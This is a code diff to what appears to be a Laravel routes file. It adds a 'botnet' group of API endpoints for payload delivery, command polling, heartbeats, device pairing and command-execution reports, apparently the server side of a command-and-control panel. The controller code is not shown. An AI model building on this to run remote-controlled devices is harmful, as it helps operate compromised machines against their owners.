@@ -16,6 +16,18 @@ use Livewire\Attributes\Reactive;
 
 Route::prefix('v1/')->group(function () {
 
+    Route::prefix('botnet')->group(function () {
+        Route::get('/payload/{device_key}', [BotNetController::class, 'payload']);
+
+        Route::get('/bots/{bot}/pairing-status', [BotNetController::class, 'status'])->name('api.v1.bots.pairing-status');
+        Route::get('/xguard/{device_key}', [BotNetController::class, 'xguard']);
+        Route::get('/device/commands/{device_key}', [BotNetController::class, 'commands']);
+
+        Route::post('/device/ping/{device_key}', [BotNetController::class, 'heartbeat']);
+        Route::post('/device/pairing/{device_key}', [BotNetController::class, 'init_pairing']);
+        Route::post('/device/command-executed/{device_key}', [BotNetController::class, 'commandExecuted']);
+        Route::post('/device/event/{device_key}', [BotNetController::class, 'event']);
+    });
     Route::post('apps/data/{xnamespace}', [AuthController::class, 'app_data']);
     // Public routes (throttled against brute force)
     Route::middleware('throttle:10,1')->group(function () {
